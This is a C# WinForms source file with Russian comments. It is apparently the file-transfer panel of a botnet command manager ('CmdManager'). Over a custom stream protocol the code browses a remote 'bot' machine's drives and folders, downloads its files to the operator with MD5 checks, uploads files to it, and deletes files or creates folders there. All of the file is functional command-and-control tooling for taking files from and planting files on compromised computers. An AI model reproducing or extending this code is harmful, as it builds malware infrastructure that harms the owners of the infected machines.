using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;

namespace CmdManager
{
	public partial class ControlFileTransfer : UserControl, IControlPage
	{
		delegate void DelegateUpdateListView(ListView lv, List<FileInfo> lfi);
		delegate void DelegateSetInfoCopy(string info, int pos);
		delegate void DelegateAddHistory(string s);
		delegate void DelegateUpdateMyFileList();
		delegate void DelegateUpdateBotFileList();

		internal class FileInfo
		{
			public string fileName;
			public DateTime date;
			public long size; //если диск, то тут полный объем диска
			public long sizeFree; //объем свободного пространства на диске (для файлов тут 0)
			public int type; //0 - файл, 1 - папка, 2 - диск

			public FileInfo(string fileName, DateTime date, long size, long sizeFree, int type)
			{
				this.fileName = fileName;
				this.date = date;
				this.size = size;
				this.sizeFree = sizeFree;
				this.type = type;
			}

			public string FileName
			{
				get 
				{
					if (type == 2)
						return fileName;
					return System.IO.Path.GetFileName(fileName); 
				}
			}

			public int Icon
			{
				get
				{
					if (type == 0)
					{
						string ext = System.IO.Path.GetExtension(fileName).ToLower().Replace(".","");
						switch (ext)
						{
							case "txt": case "doc": case "docx": case "xls": case "xlsx": case "log": case "ini":
								return 3;
							case "jpg": case "jpeg": case "bmp": case "gif": case "png": case "ico":
								return 4;
							case "rar": case "zip": case "7z":
								return 5;
						}
					}
					else if (type == 1)
						return 1;
					else if (type == 2)
						return 0;
					return 2;
				}
			}
		}

		internal class TaskFile
		{
			public FileInfo from; //информация о копируемом файле
			public string to; //имя папки куда копируется файл
			public int direction; //1 - копировать от бота ко мне, 2 - копировать от меня на бот, 3 - удалить файл, 4 - создать папку
		}

		DelegateUpdateListView funcUpdateListView;
		DelegateSetInfoCopy funcSetInfoCopy;
		DelegateAddHistory funcAddHistory;
		DelegateUpdateMyFileList funcUpdateMyFileList;
		DelegateUpdateBotFileList funcUpdateBotFileList;

		Server.IdUid bot;
		Thread threadCmdDir = null;
		Thread threadTaskFiles = null;
		Queue<TaskFile> queueFiles;
		bool stopCopy = false;

		public ControlFileTransfer(Server.IdUid bot)
		{
			InitializeComponent();
			this.bot = bot;
			
			funcUpdateListView = UpdateListView;
			funcSetInfoCopy = SetInfoCopy;
			funcAddHistory = AddHistory;
			funcUpdateMyFileList = UpdateMyFileList;
			funcUpdateBotFileList = UpdateBotFileList;

			InitListImage(lvFilesBot);
			InitListImage(lvFilesMy);

			queueFiles = new Queue<TaskFile>();
		}

		public void Start()
		{
		}

		public void Stop()
		{
		}

		void InitListImage(ListView lv)
		{
			lv.SmallImageList = new ImageList();
			lv.SmallImageList.Images.Add(global::CmdManager.Properties.Resources.hdd);
			lv.SmallImageList.Images.Add(global::CmdManager.Properties.Resources.folder);
			lv.SmallImageList.Images.Add(global::CmdManager.Properties.Resources.fileBinary);
			lv.SmallImageList.Images.Add(global::CmdManager.Properties.Resources.fileDoc);
			lv.SmallImageList.Images.Add(global::CmdManager.Properties.Resources.fileImage);
			lv.SmallImageList.Images.Add(global::CmdManager.Properties.Resources.fileCompress);
		}

		void UpdateMyFileList()
		{
			List<FileInfo> lfi = new List<FileInfo>();
			string path = tbMyFolder.Text.Trim();
			if (path.Length == 0) //показать список дисков
			{
				System.IO.DriveInfo[] df = System.IO.DriveInfo.GetDrives();
				foreach(var drive in df)
				{
					try
					{
						lfi.Add(new FileInfo(drive.Name, DateTime.MinValue, drive.TotalSize, drive.AvailableFreeSpace, 2));
					}
					catch { }
				}
			}
			else //показать файлы в папке path
			{
				try
				{
					string[] dirs = System.IO.Directory.GetDirectories(path); //к папка може не быть доступа, тогда показываем что там пусто
					Array.Sort(dirs);
					foreach (string folder in dirs)
					{
						System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(folder);
						lfi.Add(new FileInfo(folder, di.LastWriteTime, 0, 0, 1));
					}
					string[] files = System.IO.Directory.GetFiles(path);
					Array.Sort(files);
					foreach (string fn in files)
					{
						System.IO.FileInfo fi = new System.IO.FileInfo(fn);
						lfi.Add(new FileInfo(fn, fi.LastWriteTime, fi.Length, 0, 0));
					}
				}
				catch { }
			}
			UpdateListView(lvFilesMy, lfi);
		}

		void UpdateBotFileList()
		{
			if (threadCmdDir == null)
			{
				threadCmdDir = new Thread(ThreadCmdDir);
				threadCmdDir.Start();
			}
		}

		void ThreadCmdDir()
		{
			string path = tbBotFolder.Text.Trim();
			int idStream;
			Socket sc = bot.server.CM_CreateStream(bot.id, out idStream);
			List<FileInfo> dirs = new List<FileInfo>();
			List<FileInfo> files = new List<FileInfo>();
			if (sc != null)
			{
				bot.server.CM_Dir(bot.id, bot.uid, idStream, path);
				byte[] data = new byte[4096];
				int wait = 5;
				bool stop = false;
				while(wait > 0 && !stop)
				{
					int size = Server.ReadDataStream(sc, ref data, 1000);
					if (size == 0) break;
					if (size > 0)
					{
						int i = 0;
						while (i < size)
						{
							int lenPath = BitConverter.ToInt16(data, i); i += 2;
							if (lenPath == 0)
							{
								stop = true;
								break;
							}
							try
							{
								long sizeFile = BitConverter.ToInt64(data, i); i += 8;
								long sizeFree = BitConverter.ToInt64(data, i); i += 8;
								uint attr = BitConverter.ToUInt32(data, i); i += 4;
								byte day = data[i++];
								byte month = data[i++];
								int year = BitConverter.ToUInt16(data, i); i += 2;
								byte hour = data[i++];
								byte minute = data[i++];
								byte second = data[i++];
								string fileName = System.IO.Path.Combine(path, Encoding.GetEncoding(1251).GetString(data, i, lenPath)); i += lenPath;
								int type = 0;
								if ((attr & 0x40) != 0)
									type = 2;
								else if ((attr & 0x10) != 0)
									type = 1;
								DateTime date = DateTime.MinValue;
								if (type == 0 || type == 1)
									date = new DateTime(year, month, day, hour, minute, second);
								if( type == 0 )
									files.Add(new FileInfo(fileName, date, sizeFile, sizeFree, type));
								else
									dirs.Add(new FileInfo(fileName, date, sizeFile, sizeFree, type));
							}
							catch
							{
								stop = true;
								break;
							}
						}
						wait = 5;
					}
					else
					{
						wait--;
					}
				}
				bot.server.CM_CloseStream(bot.id, idStream);
				sc.Close();
			}
			dirs.Sort((l,r) => l.fileName.CompareTo(r.fileName));
			files.Sort((l, r) => l.fileName.CompareTo(r.fileName));
			dirs.AddRange(files);
			this.Invoke(funcUpdateListView, new object[] { lvFilesBot, dirs });
			threadCmdDir = null;
		}

		void SetInfoCopy(string info, int pos)
		{
			labelInfoCopy.Text = info;
			progressCopy.Value = pos;
		}

		void AddHistory(string s)
		{
			tbHistory.Text = s + "\r\n" + tbHistory.Text;
		}

		void ThreadTaskFiles()
		{
			stopCopy = false;
			while (queueFiles.Count != 0 && !stopCopy)
			{
				TaskFile tf = queueFiles.Dequeue();
				int err = 0;
				string op = string.Empty;
				switch (tf.direction)
				{
					case 1:
						op = "копирование файла";
						if (tf.from.type == 0)
						{
							err = CopyFromBot(tf.from, tf.to);
							this.Invoke(this.funcUpdateMyFileList);
						}
						else
							err = -6;
						break;
					case 2:
						op = "копирование файла";
						if (tf.from.type == 0)
						{
							err = CopyToBot(tf.from, tf.to);
							this.Invoke(this.funcUpdateBotFileList);
						}
						else
							err = -6;
						break;
					case 3:
						op = "удаление файла";
						err = DeleteFile(tf.from.fileName);
						this.Invoke(this.funcUpdateBotFileList);
						break;
					case 4:
						op = "создание папки";
						err = CreateFolder(tf.to);
						this.Invoke(this.funcUpdateBotFileList);
						break;
				}

				string s = string.Empty;
				switch (err)
				{
					case 0: s = "Операция " + op + " \"" + (tf.from != null ? tf.from.fileName : tf.to) + "\" прошла успешно"; break;
					case -1: s = "Не удалось открыть поток для операции " + op + " \"" + tf.from + "\""; break;
					case -2: 
					case -4:
					case -5:
						s = "Во время операции " + op + " \"" + tf.from.fileName + "\" произошла ошибка " + err.ToString(); break;
					case -3: s = "Невозможно создать файл \"" + tf.to + "\""; break;
					case -6: s = "Можно копировать только файлы, папки нельзя"; break;
					case -7: s = "Файл \"" + tf.from.fileName + "\" отсутствует"; break;
					case -8: s = "Ошибка копирования файла \"" + tf.from.fileName + "\", неверная контрольная сумма"; break;
					default:
						s = "При операции " + op + " произошла ошибка " + err.ToString();
						break;
				}
				this.Invoke(this.funcAddHistory, new object[] { s });
			}
			if (stopCopy)
				this.Invoke(this.funcAddHistory, new object[] { "Операции с файлами прерваны" });
			this.Invoke(this.funcSetInfoCopy, new object[] { string.Empty, 0 });
			threadTaskFiles = null;
		}

		int CopyFromBot(FileInfo from, string to)
		{
			int idStream;
			System.IO.FileStream fs = null;
			try
			{
				fs = new System.IO.FileStream(to, System.IO.FileMode.Create, System.IO.FileAccess.Write);
			}
			catch
			{
				return -3;
			}
			Socket sc = bot.server.CM_CreateStream(bot.id, out idStream);
			if (sc == null) return -1;
			bot.server.CM_GetFile(bot.id, bot.uid, idStream, from.fileName);
			byte[] data = new byte[4096];
			int err = 0;
			long saved = 0;
			int wait = 10;
			byte[] md5From = null;
			while (!stopCopy)
			{
				int pos = (int)(saved * 1000 / from.size);
				string info = "Копирование файла от бота \"" + from.fileName + "\" (" + FileSizeFormat(saved) + "/" + FileSizeFormat(from.size) + ")";
				if( queueFiles.Count > 0 ) info += ", в очереди файлов: " + queueFiles.Count.ToString();
				this.Invoke(this.funcSetInfoCopy, new object[] { info, pos });
				int size = Server.ReadDataStream(sc, ref data, 1000);
				if (size == 0)
				{
					err = -4;
					break;
				}
				if (size < 0)
				{
					wait--;
					if (wait == 0)
					{
						err = -5;
						break;
					}
					continue;
				}
				wait = 10;
				int numPacket = BitConverter.ToInt32(data, 0);
				int type = data[4];
				int sizePacket = BitConverter.ToUInt16(data, 5);
				if (7 + sizePacket != size)
				{
					err = -2; //битый пакет
					break;
				}
				if (type == 0)
				{
					try
					{
						fs.Write(data, 7, sizePacket);
						saved += sizePacket;
					}
					catch
					{
						err = -3;
						break;
					}
				}
				else if (type == 1)
				{
					md5From = new byte[sizePacket];
					Array.Copy(data, 7, md5From, 0, sizePacket);
					break;
				}
			}
			fs.Flush();
			fs.Close();
			bot.server.CM_CloseStream(bot.id, idStream);
			sc.Close();
			if (!stopCopy && err == 0)
			{
				err = -8;
				if (md5From != null)
				{
					byte[] md5To = Misc.MD5File(to);
					if (md5To != null)
					{
						if (md5From.SequenceEqual(md5To))
							err = 0;
					}
				}
			}
			return err;
		}

		int CopyToBot(FileInfo from, string to)
		{
			int idStream;
			Socket sc = bot.server.CM_CreateStream(bot.id, out idStream);
			if (sc == null) return -1;
			int err = 0;
			int step = 4000;
			byte[] data = new byte[step];
			System.IO.FileStream fs = null;
			try
			{
				fs = new System.IO.FileStream(from.fileName, System.IO.FileMode.Open, System.IO.FileAccess.Read);
			}
			catch
			{
				return -7;
			}
			ushort state = 1; //начальный блок
			ushort num = 0;
			string fileName = to;
			long loaded = 0;
			byte[] md5To = null;
			while ((state & 2) == 0 && !stopCopy)
			{
				int pos = (int)(loaded * 1000 / from.size);
				string info = "Копирование файла на бот \"" + from.fileName + "\" (" + FileSizeFormat(loaded) + "/" + FileSizeFormat(from.size) + ")";
				if (queueFiles.Count > 0) info += ", в очереди файлов: " + queueFiles.Count.ToString();
				this.Invoke(this.funcSetInfoCopy, new object[] { info, pos });
				ushort readed = (ushort)fs.Read(data, 0, step);
				if (readed < step) //конец файла
					state |= 2;
				bot.server.CM_SendFile(bot.id, bot.uid, (uint)idStream, fileName, (uint)from.size, num, state, readed, data, 0);
				fileName = string.Empty;
				num++;
				state &= 0xfffe; //сбрасываем 1
				//loaded += readed;
				//считываем потверждения от бота
				int wait = 100;
				while (!stopCopy)
				{
					int size = Server.ReadDataStream(sc, ref data, wait); //бот оповещает какой пакет был записан
					if (size <= 0) break;
					int numPacket = BitConverter.ToInt32(data, 0);
					int type = data[4];
					int sizePacket = BitConverter.ToUInt16(data, 5);
					if (type == 0) 
						loaded += sizePacket;
					else if (type == 1)
					{
						md5To = new byte[sizePacket];
						Array.Copy(data, 7, md5To, 0, sizePacket);
						break;
					}
					else if (type == 3) //ошибка на стороне бота
					{
						err = numPacket;
						state |= 2;
						break;
					}
					if ((state & 2) != 0 && type != 1) //если был отослан последний пакет, то нужно дождаться md5
						wait = 10000;
					else
						wait = 1;
				}
			}
			fs.Close();
			if (!stopCopy && err == 0)
			{
				err = -8;
				if (md5To != null)
				{
					byte[] md5From = Misc.MD5File(from.fileName);
					if (md5From != null)
					{
						if (md5From.SequenceEqual(md5To))
							err = 0;
					}
				}
			}
			return err;
		}

		int DeleteFile(string fileName)
		{
			int idStream;
			Socket sc = bot.server.CM_CreateStream(bot.id, out idStream);
			if (sc == null) return -1;
			if (!bot.server.CM_DelFile(bot.id, bot.uid, idStream, fileName)) return -1;
			byte[] data = new byte[16];
			int size = Server.ReadDataStream(sc, ref data, 10000);
			int err = 0;
			if (size > 0)
				err = BitConverter.ToInt32(data, 0);
			else
				err = -1;
			return err;
		}

		int CreateFolder(string path)
		{
			int idStream;
			Socket sc = bot.server.CM_CreateStream(bot.id, out idStream);
			if (sc == null) return -1;
			if (!bot.server.CM_CreateFolder(bot.id, bot.uid, idStream, path)) return -1;
			byte[] data = new byte[16];
			int size = Server.ReadDataStream(sc, ref data, 10000);
			int err = 0;
			if (size > 0)
				err = BitConverter.ToInt32(data, 0);
			else
				err = -1;
			return err;
		}

		void UpdateListView(ListView lv, List<FileInfo> lfi)
		{
			lv.Items.Clear();
			foreach (FileInfo fi in lfi)
			{
				ListViewItem item = lv.Items.Add(fi.FileName, fi.Icon);
				item.Tag = fi;
				string s = string.Empty;
				if (fi.date != DateTime.MinValue)
					s = fi.date.ToString("dd.MM.yyyy HH:mm");
				item.SubItems.Add(s);
				s = string.Empty;
				if (fi.type == 0)
					s = FileSizeFormat(fi.size);
				else if (fi.type == 2)
					s = FileSizeFormat(fi.sizeFree) + "/" + FileSizeFormat(fi.size);
				item.SubItems.Add(s);
			}
		}

		void PrintDetailFile(FileInfo fi, TextBox tb)
		{
			string s = fi.FileName + ", ";
			if (fi.type == 0)
				s += fi.size.ToString("# ### ### ###");
			else if (fi.type == 1)
				s += "папка";
			else if (fi.type == 2)
				s += fi.sizeFree.ToString("# ### ### ###") + "/" + fi.size.ToString("# ### ### ###");
			tb.Text = s;
		}

		string FileSizeFormat(long size)
		{
			decimal sz = size;
			string suffix = string.Empty;
			int precision = 2;
			if (size >= 1024 * 1024 * 1024)
			{
				sz /= 1024 * 1024 * 1024;
				suffix = "GB";
			}
			else if (size >= 1024 * 1024)
			{
				sz /= 1024 * 1024;
				suffix = "MB";
			}
			else if (size >= 1024)
			{
				sz /= 1024;
				suffix = "KB";
			}
			else
			{
				suffix = "B";
				precision = 0;
			}
			return sz.ToString("N" + precision) + suffix;
		}

		void AddQueueFile(TaskFile tf)
		{
			queueFiles.Enqueue(tf);
			if (threadTaskFiles == null)
			{
				threadTaskFiles = new Thread(ThreadTaskFiles);
				threadTaskFiles.Start();
			}
		}

		private void lvFilesMy_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			if (lvFilesMy.SelectedItems.Count == 1)
			{
				FileInfo fi = (FileInfo)lvFilesMy.SelectedItems[0].Tag;
				if (fi.type == 1 || fi.type == 2)
				{
					tbMyFolder.Text = fi.fileName;
					UpdateMyFileList();
				}
			}
		}

		private void lvFilesBot_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			if (lvFilesBot.SelectedItems.Count == 1)
			{
				FileInfo fi = (FileInfo)lvFilesBot.SelectedItems[0].Tag;
				if (fi.type == 1 || fi.type == 2)
				{
					tbBotFolder.Text = fi.fileName;
					UpdateBotFileList();
				}
			}
		}

		private void btFolderMyUp_Click(object sender, EventArgs e)
		{
			string path = tbMyFolder.Text;
			if (path.Length > 0)
			{
				tbMyFolder.Text = System.IO.Path.GetDirectoryName(path);
				UpdateMyFileList();
			}
		}

		private void btFolderBotUp_Click(object sender, EventArgs e)
		{
			string path = tbBotFolder.Text;
			if (path.Length > 0)
			{
				tbBotFolder.Text = System.IO.Path.GetDirectoryName(path);
				UpdateBotFileList();
			}
		}

		private void lvFilesMy_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (lvFilesMy.SelectedItems.Count == 1)
				PrintDetailFile((FileInfo)lvFilesMy.SelectedItems[0].Tag, tbMyFileDetails);
			else
				tbMyFileDetails.Text = string.Empty;
		}

		private void lvFilesBot_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (lvFilesBot.SelectedItems.Count == 1)
				PrintDetailFile((FileInfo)lvFilesBot.SelectedItems[0].Tag, tbBotFileDetails);
			else
				tbBotFileDetails.Text = string.Empty;
		}

		private void ControlFileTransfer_Load(object sender, EventArgs e)
		{
			UpdateBotFileList();
			UpdateMyFileList();
		}

		private void btCopyBotMy_Click(object sender, EventArgs e)
		{
			if (lvFilesBot.SelectedItems.Count > 0)
			{
				for (int i = 0; i < lvFilesBot.SelectedItems.Count; i++)
				{
					FileInfo fi = (FileInfo)lvFilesBot.SelectedItems[i].Tag;
					TaskFile tf = new TaskFile();
					tf.from = fi;
					tf.to = System.IO.Path.Combine(tbMyFolder.Text, System.IO.Path.GetFileName(fi.fileName));
					tf.direction = 1;
					AddQueueFile(tf);
				}
			}
		}

		private void btCopyMyBot_Click(object sender, EventArgs e)
		{
			if (lvFilesMy.SelectedItems.Count > 0)
			{
				for (int i = 0; i < lvFilesMy.SelectedItems.Count; i++)
				{
					FileInfo fi = (FileInfo)lvFilesMy.SelectedItems[i].Tag;
					TaskFile tf = new TaskFile();
					tf.from = fi;
					tf.to = System.IO.Path.Combine(tbBotFolder.Text, System.IO.Path.GetFileName(fi.fileName));
					tf.direction = 2;
					AddQueueFile(tf);
				}
			}
		}

		private void btDelBotFile_Click(object sender, EventArgs e)
		{
			if (lvFilesBot.SelectedItems.Count > 0)
			{
				if (Output.MsgQue("Вы уверены что этот файл (файлы) нужно удалить?") == DialogResult.Yes)
				{
					for (int i = 0; i < lvFilesBot.SelectedItems.Count; i++)
					{
						FileInfo fi = (FileInfo)lvFilesBot.SelectedItems[i].Tag;
						TaskFile tf = new TaskFile();
						tf.from = fi;
						tf.to = string.Empty;
						tf.direction = 3;
						AddQueueFile(tf);
					}
				}
			}
		}

		private void btCreateBotFolder_Click(object sender, EventArgs e)
		{
			FormEnterText form = new FormEnterText("Введите имя папки");
			if (form.ShowDialog() == DialogResult.OK)
			{
				TaskFile tf = new TaskFile();
				tf.from = null;
				tf.to = System.IO.Path.Combine(tbBotFolder.Text, form.Content); 
				tf.direction = 4;
				AddQueueFile(tf);
			}
		}

		private void btBotFolderUpdate_Click(object sender, EventArgs e)
		{
			UpdateBotFileList();
		}

		private void btMyFolderUpdate_Click(object sender, EventArgs e)
		{
			UpdateMyFileList();
		}

		private void btStopCopy_Click(object sender, EventArgs e)
		{
			stopCopy = true;
			bot.server.CM_StopCopy(bot.id, bot.uid);
		}

		private void btDelMyFile_Click(object sender, EventArgs e)
		{
			if (lvFilesMy.SelectedItems.Count > 0)
			{
				if (Output.MsgQue("Вы уверены что этот файл (файлы) нужно удалить?") == DialogResult.Yes)
				{
					for (int i = 0; i < lvFilesMy.SelectedItems.Count; i++)
					{
						FileInfo fi = (FileInfo)lvFilesMy.SelectedItems[i].Tag;
						System.IO.FileInfo fi2 = new System.IO.FileInfo(fi.fileName);
						try
						{
							if (fi2.Attributes == System.IO.FileAttributes.Directory)
								System.IO.Directory.Delete(fi.fileName, true);
							else
								System.IO.File.Delete(fi.fileName);
						}
						catch
						{
							Output.MsgErr("Не удалось удалить файл или папку " + fi.fileName);
							break;
						}
					}
				}
			}
			UpdateMyFileList();
		}

		private void btCreateMyFolder_Click(object sender, EventArgs e)
		{
			FormEnterText form = new FormEnterText("Введите имя папки");
			if (form.ShowDialog() == DialogResult.OK)
			{
				string path = System.IO.Path.Combine(tbMyFolder.Text, form.Content);
				try
				{
					System.IO.Directory.CreateDirectory(path);
				}
				catch
				{
					Output.MsgErr("Не возможно создать папку " + path);
				}
			}
			UpdateMyFileList();
		}

	}
}
